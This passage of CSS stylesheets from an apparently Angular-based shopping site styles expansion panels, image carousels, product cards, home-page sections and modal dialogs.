        visibility: hidden !important
      }

      .mat-expansion-panel-body {
        padding: 0 24px 16px
      }

      .mat-expansion-panel-spacing {
        margin: 16px 0
      }

      .mat-accordion>.mat-expansion-panel-spacing:first-child,
      .mat-accordion>*:first-child:not(.mat-expansion-panel) .mat-expansion-panel-spacing {
        margin-top: 0
      }

      .mat-accordion>.mat-expansion-panel-spacing:last-child,
      .mat-accordion>*:last-child:not(.mat-expansion-panel) .mat-expansion-panel-spacing {
        margin-bottom: 0
      }

      .mat-action-row {
        border-top-style: solid;
        border-top-width: 1px;
        display: flex;
        flex-direction: row;
        justify-content: flex-end;
        padding: 16px 8px 16px 24px
      }

      .mat-action-row .mat-button-base,
      .mat-action-row .mat-mdc-button-base {
        margin-left: 8px
      }

      [dir=rtl] .mat-action-row .mat-button-base,
      [dir=rtl] .mat-action-row .mat-mdc-button-base {
        margin-left: 0;
        margin-right: 8px
      }
    </style>
    <style>
      .mat-expansion-panel-header {
        display: flex;
        flex-direction: row;
        align-items: center;
        padding: 0 24px;
        border-radius: inherit;
        transition: height 225ms cubic-bezier(0.4, 0, 0.2, 1)
      }

      .mat-expansion-panel-header._mat-animation-noopable {
        transition: none
      }

      .mat-expansion-panel-header:focus,
      .mat-expansion-panel-header:hover {
        outline: none
      }

      .mat-expansion-panel-header.mat-expanded:focus,
      .mat-expansion-panel-header.mat-expanded:hover {
        background: inherit
      }

      .mat-expansion-panel-header:not([aria-disabled=true]) {
        cursor: pointer
      }

      .mat-expansion-panel-header.mat-expansion-toggle-indicator-before {
        flex-direction: row-reverse
      }

      .mat-expansion-panel-header.mat-expansion-toggle-indicator-before .mat-expansion-indicator {
        margin: 0 16px 0 0
      }

      [dir=rtl] .mat-expansion-panel-header.mat-expansion-toggle-indicator-before .mat-expansion-indicator {
        margin: 0 0 0 16px
      }

      .mat-content {
        display: flex;
        flex: 1;
        flex-direction: row;
        overflow: hidden
      }

      .mat-content.mat-content-hide-toggle {
        margin-right: 8px
      }

      [dir=rtl] .mat-content.mat-content-hide-toggle {
        margin-right: 0;
        margin-left: 8px
      }

      .mat-expansion-toggle-indicator-before .mat-content.mat-content-hide-toggle {
        margin-left: 24px;
        margin-right: 0
      }

      [dir=rtl] .mat-expansion-toggle-indicator-before .mat-content.mat-content-hide-toggle {
        margin-right: 24px;
        margin-left: 0
      }

      .mat-expansion-panel-header-title,
      .mat-expansion-panel-header-description {
        display: flex;
        flex-grow: 1;
        flex-basis: 0;
        margin-right: 16px;
        align-items: center
      }

      [dir=rtl] .mat-expansion-panel-header-title,
      [dir=rtl] .mat-expansion-panel-header-description {
        margin-right: 0;
        margin-left: 16px
      }

      .mat-expansion-panel-header-description {
        flex-grow: 2
      }

      .mat-expansion-indicator::after {
        border-style: solid;
        border-width: 0 2px 2px 0;
        content: "";
        display: inline-block;
        padding: 3px;
        transform: rotate(45deg);
        vertical-align: middle
      }

      .cdk-high-contrast-active .mat-expansion-panel-content {
        border-top: 1px solid;
        border-top-left-radius: 0;
        border-top-right-radius: 0
      }
    </style>
    <style>
      [_nghost-isc-c143] {
        display: block;
        overflow: hidden;
        width: 100%;
        height: 100%
      }

      .flickity-enabled[_ngcontent-isc-c143] {
        position: relative
      }

      .flickity-enabled[_ngcontent-isc-c143]:focus {
        outline: none
      }

      .carousel[_ngcontent-isc-c143] {
        display: flex;
        justify-content: center;
        width: 100%;
        margin-right: .675rem
      }

      .carousel[_ngcontent-isc-c143] figure[_ngcontent-isc-c143] {
        min-height: 320px;
        display: flex;
        justify-content: center;
        flex-direction: column;
        margin: auto
      }

      .carousel[_ngcontent-isc-c143] img[_ngcontent-isc-c143] {
        cursor: zoom-in;
        max-width: 100%;
        max-height: 35vh
      }

      .any-carousel[_ngcontent-isc-c143] .carousel[_ngcontent-isc-c143] {
        display: inline-block;
        width: unset
      }

      .flickity-prev-next-button {
        position: absolute;
        top: 50%;
        border-radius: 50%;
        width: 3rem;
        height: 3rem;
        border: none;
        background: transparent;
        cursor: pointer;
        transform: translateY(-50%)
      }

      .flickity-prev-next-button.previous {
        left: -1px
      }

      .flickity-prev-next-button.next {
        right: -1px
      }

      .flickity-prev-next-button:disabled {
        opacity: .3;
        cursor: auto
      }

      .flickity-prev-next-button svg {
        position: absolute;
        left: 20%;
        top: 20%;
        width: 60%;
        height: 60%;
        filter: drop-shadow(0px 3px 3px rgba(0, 0, 0, .3));
        fill: #c7c7c7
      }

      .any-carousel .flickity-prev-next-button {
        position: absolute;
        border-radius: 50%;
        width: 3rem;
        height: 3rem;
        border: none;
        cursor: pointer;
        right: 0;
        top: 50%;
        background-color: var(--basicColorWhite);
        filter: drop-shadow(0px 3px 3px rgba(0, 0, 0, .3))
      }

      .any-carousel .flickity-prev-next-button:disabled {
        display: none
      }

      .any-carousel .flickity-prev-next-button.previous {
        left: 0;
        transform: translate(-50%, -50%)
      }

      .any-carousel .flickity-prev-next-button.previous svg {
        left: 50%
      }

      .any-carousel .flickity-prev-next-button.next {
        transform: translate(50%, -50%)
      }

      .any-carousel .flickity-prev-next-button.next svg {
        left: 20%
      }

      .any-carousel .flickity-prev-next-button svg {
        left: 13%;
        top: 20%;
        width: 35%;
        height: 60%;
        fill: var(--basicColor900);
        filter: none
      }
    </style>
    <style>
      @keyframes spin {
        0% {
          transform: rotate(0)
        }

        to {
          transform: rotate(360deg)
        }
      }

      @keyframes presence {
        0% {
          opacity: 0
        }

        to {
          opacity: 1
        }
      }

      [_nghost-isc-c363] {
        display: block
      }

      [_nghost-isc-c363] fe-product-labels .product-labels {
        padding: .25rem;
        gap: .125rem;
        flex-wrap: wrap
      }

      mat-card[_ngcontent-isc-c363] {
        width: 19rem;
        height: 8.8rem;
        padding: .5rem .75rem .706rem .5rem;
        border-radius: 8px;
        display: flex;
        flex-direction: row;
        border: solid 1px rgba(0, 0, 0, .12);
        box-shadow: none
      }

      @media (min-width: 768px) {
        mat-card[_ngcontent-isc-c363] {
          width: 20rem
        }
      }

      mat-card[_ngcontent-isc-c363] fe-product-image[_ngcontent-isc-c363] {
        max-width: 5.5rem;
        max-height: 5.5rem;
        min-width: 5.5rem;
        min-height: 5.5rem
      }

      mat-card[_ngcontent-isc-c363] .info[_ngcontent-isc-c363] {
        flex: 2 2 auto;
        margin-left: .5rem
      }

      mat-card[_ngcontent-isc-c363] .info[_ngcontent-isc-c363] p[_ngcontent-isc-c363] {
        cursor: pointer;
        margin-bottom: 0;
        overflow: hidden;
        display: -webkit-box;
        -webkit-line-clamp: 2;
        -webkit-box-orient: vertical;
        text-overflow: ellipsis
      }

      mat-card[_ngcontent-isc-c363] .info[_ngcontent-isc-c363] .price[_ngcontent-isc-c363] {
        bottom: .6rem;
        left: 6.5rem;
        position: absolute
      }

      mat-card[_ngcontent-isc-c363] .info.small-text[_ngcontent-isc-c363] p[_ngcontent-isc-c363] {
        font-size: .725rem
      }

      mat-card[_ngcontent-isc-c363] sm-product-actions[_ngcontent-isc-c363] {
        flex-grow: 1;
        align-self: flex-end;
        position: absolute;
        bottom: .75rem;
        right: .75rem
      }
    </style>
    <style>
      [_nghost-isc-c394] {
        display: block
      }

      .side-banner-card[_ngcontent-isc-c394] {
        padding: 1rem 0;
        border-radius: 8px;
        border: solid 1px rgba(0, 0, 0, .12);
        box-shadow: none
      }

      .side-banner-card[_ngcontent-isc-c394] .title[_ngcontent-isc-c394] {
        margin-bottom: 1rem;
        display: block
      }

      .side-banner-card[_ngcontent-isc-c394] .header[_ngcontent-isc-c394],
      .side-banner-card[_ngcontent-isc-c394] .action[_ngcontent-isc-c394] {
        padding: 0 1rem
      }

      .side-banner-card[_ngcontent-isc-c394] img[_ngcontent-isc-c394] {
        max-height: 12.5rem;
        width: 100%;
        cursor: pointer
      }

      .side-banner-card[_ngcontent-isc-c394] button[_ngcontent-isc-c394] {
        margin-top: 1rem;
        width: 100%;
        height: auto;
        padding: 1rem
      }
    </style>
    <style>
      @keyframes spin {
        0% {
          transform: rotate(0)
        }

        to {
          transform: rotate(360deg)
        }
      }

      @keyframes presence {
        0% {
          opacity: 0
        }

        to {
          opacity: 1
        }
      }

      .home-page-wrapper[_ngcontent-isc-c364] .mat-tab-group[_ngcontent-isc-c364] .mat-tab-header[_ngcontent-isc-c364] {
        display: none
      }

      .home-page-wrapper[_ngcontent-isc-c364] .section[_ngcontent-isc-c364] {
        margin-top: 3rem;
        position: relative
      }

      .home-page-wrapper[_ngcontent-isc-c364] .section.no-title[_ngcontent-isc-c364] {
        margin-top: 0
      }

      @media (max-width: 576px) {
        .home-page-wrapper[_ngcontent-isc-c364] .section[_ngcontent-isc-c364] {
          margin-top: 1rem
        }
      }

      .home-page-wrapper[_ngcontent-isc-c364] .section[_ngcontent-isc-c364] .section-title[_ngcontent-isc-c364] {
        margin-bottom: 1.25rem;
        font-size: 1.1rem
      }

      @media (max-width: 576px) {
        .home-page-wrapper[_ngcontent-isc-c364] .section[_ngcontent-isc-c364] .section-title[_ngcontent-isc-c364] {
          margin-bottom: .75rem;
          font-size: 1.1rem;
          padding: 0 1rem
        }
      }

      .home-page-wrapper[_ngcontent-isc-c364] .section[_ngcontent-isc-c364] .fade-out[_ngcontent-isc-c364] {
        position: absolute;
        right: 0;
        bottom: 0;
        top: 40px;
        width: 120px;
        z-index: 1;
        background: linear-gradient(to right, rgba(255, 255, 255, 0) 0%, white 100%);
        pointer-events: none
      }

      @media (max-width: 576px) {
        .home-page-wrapper[_ngcontent-isc-c364] .section[_ngcontent-isc-c364] .fade-out[_ngcontent-isc-c364] {
          display: none
        }
      }

      .home-page-wrapper[_ngcontent-isc-c364] .section[_ngcontent-isc-c364] .fade-out.categories[_ngcontent-isc-c364] {
        bottom: 0;
        top: 50px
      }

      @media (min-width: 768px) {
        .home-page-wrapper[_ngcontent-isc-c364] .section[_ngcontent-isc-c364] .fade-out.categories[_ngcontent-isc-c364] {
          display: none
        }
      }

      .home-page-wrapper[_ngcontent-isc-c364] .section[_ngcontent-isc-c364] .horizontal-list-page-items-container[_ngcontent-isc-c364] {
        display: flex;
        overflow-y: scroll;
        scrollbar-width: none;
        -ms-overflow-style: none
      }

      .home-page-wrapper[_ngcontent-isc-c364] .section[_ngcontent-isc-c364] .horizontal-list-page-items-container[_ngcontent-isc-c364]::-webkit-scrollbar {
        width: 0;
        height: 0
      }

      .home-page-wrapper[_ngcontent-isc-c364] .section[_ngcontent-isc-c364] .horizontal-list-page-items-container.in-mat-tab-group[_ngcontent-isc-c364] {
        overflow-x: unset
      }

      .home-page-wrapper[_ngcontent-isc-c364] .section[_ngcontent-isc-c364] .horizontal-list-page-items-container[_ngcontent-isc-c364] sm-list-page-item[_ngcontent-isc-c364] {
        margin-right: .625rem
      }

      @media (max-width: 768px) {
        .home-page-wrapper[_ngcontent-isc-c364] .section[_ngcontent-isc-c364] .horizontal-list-page-items-container[_ngcontent-isc-c364] sm-list-page-item[_ngcontent-isc-c364] {
          margin-right: .5rem
        }
      }

      @media (max-width: 768px) {
        .home-page-wrapper[_ngcontent-isc-c364] .section[_ngcontent-isc-c364] .horizontal-list-page-items-container[_ngcontent-isc-c364] {
          padding: 0 0 0 1rem
        }
      }

      .home-page-wrapper[_ngcontent-isc-c364] .section[_ngcontent-isc-c364] .vertical-list-page-items-container[_ngcontent-isc-c364] {
        display: grid;
        grid-template-rows: 1fr 1fr 1fr 1fr;
        grid-auto-flow: column;
        gap: .75rem 0;
        overflow-y: scroll;
        scrollbar-width: none;
        -ms-overflow-style: none
      }

      .home-page-wrapper[_ngcontent-isc-c364] .section[_ngcontent-isc-c364] .vertical-list-page-items-container[_ngcontent-isc-c364]::-webkit-scrollbar {
        width: 0;
        height: 0
      }

      .home-page-wrapper[_ngcontent-isc-c364] .section[_ngcontent-isc-c364] .vertical-list-page-items-container.in-mat-tab-group[_ngcontent-isc-c364] {
        overflow-x: unset
      }

      .home-page-wrapper[_ngcontent-isc-c364] .section[_ngcontent-isc-c364] .vertical-list-page-items-container[_ngcontent-isc-c364] sm-list-page-item[_ngcontent-isc-c364] {
        margin-right: .625rem
      }

      @media (max-width: 768px) {
        .home-page-wrapper[_ngcontent-isc-c364] .section[_ngcontent-isc-c364] .vertical-list-page-items-container[_ngcontent-isc-c364] sm-list-page-item[_ngcontent-isc-c364] {
          margin-right: .5rem
        }
      }

      .home-page-wrapper[_ngcontent-isc-c364] .next-btn[_ngcontent-isc-c364] {
        border-radius: 50%;
        width: 3.5rem;
        height: 3.5rem;
        transform: translate(50%, -50%);
        background-color: var(--basicColorWhite);
        filter: drop-shadow(0 3px 3px rgba(0, 0, 0, .3));
        right: 0;
        top: 50%;
        position: absolute;
        z-index: 2;
        cursor: pointer
      }

      @media (max-width: 576px) {
        .home-page-wrapper[_ngcontent-isc-c364] .next-btn[_ngcontent-isc-c364] {
          display: none
        }
      }

      .home-page-wrapper[_ngcontent-isc-c364] .next-btn[_ngcontent-isc-c364]:after {
        content: "";
        display: inline-block;
        height: .3em;
        width: .3em;
        border-style: solid;
        border-width: .05em .05em 0 0;
        transform: rotate(45deg)
      }

      .home-page-wrapper[_ngcontent-isc-c364] .next-btn[_ngcontent-isc-c364]:after {
        left: .4em;
        position: relative;
        font-size: 2rem;
        top: 1rem
      }

      .home-page-wrapper[_ngcontent-isc-c364] .prev-btn[_ngcontent-isc-c364] {
        border-radius: 50%;
        width: 3.5rem;
        height: 3.5rem;
        transform: translate(-50%, -50%);
        background-color: var(--basicColorWhite);
        filter: drop-shadow(0 3px 3px rgba(0, 0, 0, .3));
        left: 0;
        top: 50%;
        position: absolute;
        z-index: 2;
        cursor: pointer;
        opacity: .4;
        transition: .2s ease-in-out
      }

      @media (max-width: 576px) {
        .home-page-wrapper[_ngcontent-isc-c364] .prev-btn[_ngcontent-isc-c364] {
          display: none
        }
      }

      .home-page-wrapper[_ngcontent-isc-c364] .prev-btn[_ngcontent-isc-c364]:after {
        content: "";
        display: inline-block;
        height: .3em;
        width: .3em;
        border-style: solid;
        border-width: .05em .05em 0 0;
        transform: rotate(225deg)
      }

      .home-page-wrapper[_ngcontent-isc-c364] .prev-btn[_ngcontent-isc-c364]:after {
        left: 1.15em;
        position: relative;
        font-size: 2rem;
        top: 1rem
      }

      [_nghost-isc-c364] sm-list-page-item {
        min-width: 10.25rem;
        max-width: 10.25rem
      }

      [_nghost-isc-c364] sm-list-page-item .mdc-card {
        border-radius: 8px
      }

      [_nghost-isc-c364] .mat-mdc-tab-group {
        flex-direction: row !important
      }

      [_nghost-isc-c364] .mat-mdc-tab-labels {
        flex-direction: column !important
      }

      [_nghost-isc-c364] .mat-mdc-tab {
        justify-content: start;
        padding-left: 1rem;
        margin-bottom: 1rem;
        margin-right: 6rem
      }

      [_nghost-isc-c364] .mdc-tab--active .mdc-tab-indicator {
        position: absolute;
        left: 0;
        bottom: 0;
        top: 0 !important;
        width: .3rem;
        height: 100%;
        background-color: var(--brandColorPrimary700)
      }

      [_nghost-isc-c364] .mdc-tab--active .mdc-tab-indicator__content {
        opacity: 0
      }

      [_nghost-isc-c364] .mdc-tab__text-label {
        margin: 0
      }

      [_nghost-isc-c364] .mat-mdc-tab-body-content {
        display: flex;
        gap: 1.5rem;
        overflow-y: scroll;
        scrollbar-width: none;
        -ms-overflow-style: none
      }

      [_nghost-isc-c364] .mat-mdc-tab-body-content .container-wrapper .fade-out {
        top: 0 !important
      }

      [_nghost-isc-c364] .mat-mdc-tab-body-content::-webkit-scrollbar {
        width: 0;
        height: 0
      }

      [_nghost-isc-c364] .mat-mdc-tab-body-wrapper {
        width: 100%
      }

      [_nghost-isc-c364] sm-special-discount-product-card.list-item>mat-card>fe-product-image {
        flex: unset
      }

      [_nghost-isc-c364] .vertical .mat-mdc-tab-body-wrapper {
        margin: auto;
        width: 20rem
      }

      @media (max-width: 768px) {
        [_nghost-isc-c364] .vertical .mat-mdc-tab-body-wrapper {
          width: 19rem
        }
      }

      [_nghost-isc-c364] .vertical .fade-out {
        display: none
      }

      [_nghost-isc-c364] .vertical .next-btn {
        display: block !important
      }

      [_nghost-isc-c364] .vertical .prev-btn {
        display: block !important
      }
    </style>
    <style>
      .mdc-dialog .mdc-dialog__close.mdc-ripple-upgraded--background-focused .mdc-icon-button__ripple::before,
      .mdc-dialog .mdc-dialog__close:not(.mdc-ripple-upgraded):focus .mdc-icon-button__ripple::before {
        transition-duration: 75ms
      }

      .mdc-dialog .mdc-dialog__close:not(.mdc-ripple-upgraded) .mdc-icon-button__ripple::after {
        transition: opacity 150ms linear
      }

      .mdc-dialog .mdc-dialog__close:not(.mdc-ripple-upgraded):active .mdc-icon-button__ripple::after {
        transition-duration: 75ms
      }

      .mdc-dialog .mdc-dialog__surface {
        border-radius: var(--mdc-shape-medium, 4px)
      }

      .mdc-elevation-overlay {
        position: absolute;
        border-radius: inherit;
        pointer-events: none;
        opacity: var(--mdc-elevation-overlay-opacity, 0);
        transition: opacity 280ms cubic-bezier(0.4, 0, 0.2, 1)
      }

      .mdc-dialog,
      .mdc-dialog__scrim {
        position: fixed;
        top: 0;
        left: 0;
        align-items: center;
        justify-content: center;
        box-sizing: border-box;
        width: 100%;
        height: 100%
      }

      .mdc-dialog {
        display: none;
        z-index: var(--mdc-dialog-z-index, 7)
      }

      .mdc-dialog .mdc-dialog__content {
        padding: 20px 24px 20px 24px
      }

      .mdc-dialog .mdc-dialog__surface {
        min-width: 280px
      }

      @media(max-width: 592px) {
        .mdc-dialog .mdc-dialog__surface {
          max-width: calc(100vw - 32px)
        }
      }

      @media(min-width: 592px) {
        .mdc-dialog .mdc-dialog__surface {
          max-width: 560px
        }
      }

      .mdc-dialog .mdc-dialog__surface {
        max-height: calc(100% - 32px)
      }

      .mdc-dialog.mdc-dialog--fullscreen .mdc-dialog__surface {
        max-width: none
      }

      @media(max-width: 960px) {
        .mdc-dialog.mdc-dialog--fullscreen .mdc-dialog__surface {
          max-height: 560px;
          width: 560px
        }

        .mdc-dialog.mdc-dialog--fullscreen .mdc-dialog__surface .mdc-dialog__close {
          right: -12px
        }
      }

      @media(max-width: 720px)and (max-width: 672px) {
        .mdc-dialog.mdc-dialog--fullscreen .mdc-dialog__surface {
          width: calc(100vw - 112px)
        }
      }

      @media(max-width: 720px)and (min-width: 672px) {
        .mdc-dialog.mdc-dialog--fullscreen .mdc-dialog__surface {
          width: 560px
        }
      }

      @media(max-width: 720px)and (max-height: 720px) {
        .mdc-dialog.mdc-dialog--fullscreen .mdc-dialog__surface {
          max-height: calc(100vh - 160px)
        }
      }

      @media(max-width: 720px)and (min-height: 720px) {
        .mdc-dialog.mdc-dialog--fullscreen .mdc-dialog__surface {
          max-height: 560px
        }
      }

      @media(max-width: 720px) {
        .mdc-dialog.mdc-dialog--fullscreen .mdc-dialog__surface .mdc-dialog__close {
          right: -12px
        }
      }

      @media(max-width: 720px)and (max-height: 400px) {
        .mdc-dialog.mdc-dialog--fullscreen .mdc-dialog__surface {
          height: 100%;
          max-height: 100vh;
          max-width: 100vw;
          width: 100vw;
          border-radius: 0
        }

        .mdc-dialog.mdc-dialog--fullscreen .mdc-dialog__surface .mdc-dialog__close {
          order: -1;
          left: -12px
        }

        .mdc-dialog.mdc-dialog--fullscreen .mdc-dialog__surface .mdc-dialog__header {
          padding: 0 16px 9px;
          justify-content: flex-start
        }

        .mdc-dialog.mdc-dialog--fullscreen .mdc-dialog__surface .mdc-dialog__title {
          margin-left: calc(16px - 2 * 12px)
        }
      }

      @media(max-width: 600px) {
        .mdc-dialog.mdc-dialog--fullscreen .mdc-dialog__surface {
          height: 100%;
          max-height: 100vh;
          max-width: 100vw;
          width: 100vw;
          border-radius: 0
        }

        .mdc-dialog.mdc-dialog--fullscreen .mdc-dialog__surface .mdc-dialog__close {
          order: -1;
          left: -12px
        }

        .mdc-dialog.mdc-dialog--fullscreen .mdc-dialog__surface .mdc-dialog__header {
          padding: 0 16px 9px;
          justify-content: flex-start
        }

        .mdc-dialog.mdc-dialog--fullscreen .mdc-dialog__surface .mdc-dialog__title {
          margin-left: calc(16px - 2 * 12px)
        }
      }

      @media(min-width: 960px) {
        .mdc-dialog.mdc-dialog--fullscreen .mdc-dialog__surface {
          width: calc(100vw - 400px)
        }

        .mdc-dialog.mdc-dialog--fullscreen .mdc-dialog__surface .mdc-dialog__close {
          right: -12px
        }
      }

      .mdc-dialog.mdc-dialog__scrim--hidden .mdc-dialog__scrim {
        opacity: 0
      }

      .mdc-dialog__scrim {
        opacity: 0;
        z-index: -1
      }

      .mdc-dialog__container {
        display: flex;
        flex-direction: row;
        align-items: center;
        justify-content: space-around;
        box-sizing: border-box;
        height: 100%;
        transform: scale(0.8);
        opacity: 0;
        pointer-events: none
      }

      .mdc-dialog__surface {
        position: relative;
        display: flex;
        flex-direction: column;
        flex-grow: 0;
        flex-shrink: 0;
        box-sizing: border-box;
        max-width: 100%;
        max-height: 100%;
        pointer-events: auto;
        overflow-y: auto
      }

      .mdc-dialog__surface .mdc-elevation-overlay {
        width: 100%;
        height: 100%;
        top: 0;
        left: 0
      }

      [dir=rtl] .mdc-dialog__surface,
      .mdc-dialog__surface[dir=rtl] {
        text-align: right
      }

      @media screen and (forced-colors: active),
      (-ms-high-contrast: active) {
        .mdc-dialog__surface {
          outline: 2px solid windowText
        }
      }

      .mdc-dialog__surface::before {
        position: absolute;
        box-sizing: border-box;
        width: 100%;
        height: 100%;
        top: 0;
        left: 0;
        border: 2px solid rgba(0, 0, 0, 0);
        border-radius: inherit;
        content: "";
        pointer-events: none
      }

      @media screen and (forced-colors: active) {
        .mdc-dialog__surface::before {
          border-color: CanvasText
        }
      }

      @media screen and (-ms-high-contrast: active),
      screen and (-ms-high-contrast: none) {
        .mdc-dialog__surface::before {
          content: none
        }
      }

      .mdc-dialog__title {
        display: block;
        margin-top: 0;
        position: relative;
        flex-shrink: 0;
        box-sizing: border-box;
        margin: 0 0 1px;
        padding: 0 24px 9px
      }

      .mdc-dialog__title::before {
        display: inline-block;
        width: 0;
        height: 40px;
        content: "";
        vertical-align: 0
      }

      [dir=rtl] .mdc-dialog__title,
      .mdc-dialog__title[dir=rtl] {
        text-align: right
      }

      .mdc-dialog--scrollable .mdc-dialog__title {
        margin-bottom: 1px;
        padding-bottom: 15px
      }

      .mdc-dialog--fullscreen .mdc-dialog__header {
        align-items: baseline;
        border-bottom: 1px solid rgba(0, 0, 0, 0);
        display: inline-flex;
        justify-content: space-between;
        padding: 0 24px 9px;
        z-index: 1
      }

      @media screen and (forced-colors: active) {
        .mdc-dialog--fullscreen .mdc-dialog__header {
          border-bottom-color: CanvasText
        }
      }

      .mdc-dialog--fullscreen .mdc-dialog__header .mdc-dialog__close {
        right: -12px
      }

      .mdc-dialog--fullscreen .mdc-dialog__title {
        margin-bottom: 0;
        padding: 0;
        border-bottom: 0
      }

      .mdc-dialog--fullscreen.mdc-dialog--scrollable .mdc-dialog__title {
        border-bottom: 0;
        margin-bottom: 0
      }

      .mdc-dialog--fullscreen .mdc-dialog__close {
        top: 5px
      }

      .mdc-dialog--fullscreen.mdc-dialog--scrollable .mdc-dialog__actions {
        border-top: 1px solid rgba(0, 0, 0, 0)
      }

      @media screen and (forced-colors: active) {
        .mdc-dialog--fullscreen.mdc-dialog--scrollable .mdc-dialog__actions {
          border-top-color: CanvasText
        }
      }

      .mdc-dialog__content {
        flex-grow: 1;
        box-sizing: border-box;
        margin: 0;
        overflow: auto
      }

      .mdc-dialog__content>:first-child {
        margin-top: 0
      }

      .mdc-dialog__content>:last-child {
        margin-bottom: 0
      }

      .mdc-dialog__title+.mdc-dialog__content,
      .mdc-dialog__header+.mdc-dialog__content {
        padding-top: 0
      }

      .mdc-dialog--scrollable .mdc-dialog__title+.mdc-dialog__content {
        padding-top: 8px;
        padding-bottom: 8px
      }

      .mdc-dialog__content .mdc-deprecated-list:first-child:last-child {
        padding: 6px 0 0
      }

      .mdc-dialog--scrollable .mdc-dialog__content .mdc-deprecated-list:first-child:last-child {
        padding: 0
      }

      .mdc-dialog__actions {
        display: flex;
        position: relative;
        flex-shrink: 0;
        flex-wrap: wrap;
        align-items: center;
        justify-content: flex-end;
        box-sizing: border-box;
        min-height: 52px;
        margin: 0;
        padding: 8px;
        border-top: 1px solid rgba(0, 0, 0, 0)
      }

      @media screen and (forced-colors: active) {
        .mdc-dialog__actions {
          border-top-color: CanvasText
        }
      }

      .mdc-dialog--stacked .mdc-dialog__actions {
        flex-direction: column;
        align-items: flex-end
      }

      .mdc-dialog__button {
        margin-left: 8px;
        margin-right: 0;
        max-width: 100%;
        text-align: right
      }

      [dir=rtl] .mdc-dialog__button,
      .mdc-dialog__button[dir=rtl] {
        margin-left: 0;
        margin-right: 8px
      }

      .mdc-dialog__button:first-child {
        margin-left: 0;
        margin-right: 0
      }

      [dir=rtl] .mdc-dialog__button:first-child,
      .mdc-dialog__button:first-child[dir=rtl] {
        margin-left: 0;
        margin-right: 0
      }

      [dir=rtl] .mdc-dialog__button,
      .mdc-dialog__button[dir=rtl] {
        text-align: left
      }

      .mdc-dialog--stacked .mdc-dialog__button:not(:first-child) {
        margin-top: 12px
      }

      .mdc-dialog--open,
      .mdc-dialog--opening,
      .mdc-dialog--closing {
        display: flex
      }

      .mdc-dialog--opening .mdc-dialog__scrim {
        transition: opacity 150ms linear
      }

      .mdc-dialog--opening .mdc-dialog__container {
        transition: opacity 75ms linear, transform 150ms 0ms cubic-bezier(0, 0, 0.2, 1)
      }

      .mdc-dialog--closing .mdc-dialog__scrim,
      .mdc-dialog--closing .mdc-dialog__container {
        transition: opacity 75ms linear
      }

      .mdc-dialog--closing .mdc-dialog__container {
        transform: none
      }

      .mdc-dialog--open .mdc-dialog__scrim {
        opacity: 1
      }

      .mdc-dialog--open .mdc-dialog__container {
        transform: none;
        opacity: 1
      }

      .mdc-dialog--open.mdc-dialog__surface-scrim--shown .mdc-dialog__surface-scrim {
        opacity: 1;
        z-index: 1
      }

      .mdc-dialog--open.mdc-dialog__surface-scrim--hiding .mdc-dialog__surface-scrim {
        transition: opacity 75ms linear
      }

      .mdc-dialog--open.mdc-dialog__surface-scrim--showing .mdc-dialog__surface-scrim {
        transition: opacity 150ms linear
      }

      .mdc-dialog__surface-scrim {
        display: none;
        opacity: 0;
        position: absolute;
        width: 100%;
        height: 100%
      }

      .mdc-dialog__surface-scrim--shown .mdc-dialog__surface-scrim,
      .mdc-dialog__surface-scrim--showing .mdc-dialog__surface-scrim,
      .mdc-dialog__surface-scrim--hiding .mdc-dialog__surface-scrim {
        display: block
      }

      .mdc-dialog-scroll-lock {
        overflow: hidden
      }

      .mdc-dialog--no-content-padding .mdc-dialog__content {
        padding: 0
      }

      .mdc-dialog--sheet .mdc-dialog__close {
        right: 12px;
        top: 9px;
        position: absolute;
        z-index: 1
      }

      .mat-mdc-dialog-content {
        max-height: 65vh
      }

      .mat-mdc-dialog-container {
        position: static;
        display: block
      }

      .mat-mdc-dialog-container,
      .mat-mdc-dialog-container .mdc-dialog__container,
      .mat-mdc-dialog-container .mdc-dialog__surface {
        max-height: inherit;
        min-height: inherit;
        min-width: inherit;
        max-width: inherit
      }

      .mat-mdc-dialog-container .mdc-dialog__surface {
        display: block;
        width: 100%;
        height: 100%
      }

      .mat-mdc-dialog-container {
        outline: 0
      }

      .mat-mdc-dialog-container .mdc-dialog__surface {
        background-color: var(--mdc-dialog-container-color, white)
      }

      .mat-mdc-dialog-container .mdc-dialog__surface {
        --mdc-elevation-box-shadow-for-gss: 0px 11px 15px -7px rgba(0, 0, 0, 0.2), 0px 24px 38px 3px rgba(0, 0, 0, 0.14), 0px 9px 46px 8px rgba(0, 0, 0, 0.12);
        box-shadow: var(--mdc-dialog-container-elevation, var(--mdc-elevation-box-shadow-for-gss))
      }

      .mat-mdc-dialog-container.mdc-dialog--scrollable .mdc-dialog__title,
      .mat-mdc-dialog-container.mdc-dialog--scrollable .mdc-dialog__actions,
      .mat-mdc-dialog-container.mdc-dialog--scrollable.mdc-dialog-scroll-divider-footer .mdc-dialog__actions {
        border-color: var(--mdc-dialog-with-divider-divider-color, black)
      }

      .mat-mdc-dialog-container.mdc-dialog--scrollable .mdc-dialog__title {
        border-bottom-color: var(--mdc-dialog-with-divider-divider-color, black)
      }

      .mat-mdc-dialog-container .mdc-dialog__title {
        font-family: var(--mdc-dialog-subhead-font, "Arial");
        line-height: var(--mdc-dialog-subhead-line-height, 14px);
        font-size: var(--mdc-dialog-subhead-size, 14px);
        font-weight: var(--mdc-dialog-subhead-weight, 500);
        letter-spacing: var(--mdc-dialog-subhead-tracking, 1px)
      }

      .mat-mdc-dialog-container .mdc-dialog__title {
        color: var(--mdc-dialog-subhead-color, black)
      }

      .mat-mdc-dialog-container .mdc-dialog__content {
        font-family: var(--mdc-dialog-supporting-text-font, "Arial");
        line-height: var(--mdc-dialog-supporting-text-line-height, 14px);
        font-size: var(--mdc-dialog-supporting-text-size, 14px);
        font-weight: var(--mdc-dialog-supporting-text-weight, 500);
        letter-spacing: var(--mdc-dialog-supporting-text-tracking, 1px)
      }

      .mat-mdc-dialog-container .mdc-dialog__content {
        color: var(--mdc-dialog-supporting-text-color, black)
      }

      .mat-mdc-dialog-container._mat-animation-noopable .mdc-dialog__container {
        transition: none
      }

      .mat-mdc-dialog-content {
        display: block
      }

      .mat-mdc-dialog-actions {
        justify-content: start
      }

      .mat-mdc-dialog-actions.mat-mdc-dialog-actions-align-center,
      .mat-mdc-dialog-actions[align=center] {
        justify-content: center
      }

      .mat-mdc-dialog-actions.mat-mdc-dialog-actions-align-end,
      .mat-mdc-dialog-actions[align=end] {
        justify-content: flex-end
      }

      .mat-mdc-dialog-actions .mat-button-base+.mat-button-base,
      .mat-mdc-dialog-actions .mat-mdc-button-base+.mat-mdc-button-base {
        margin-left: 8px
      }

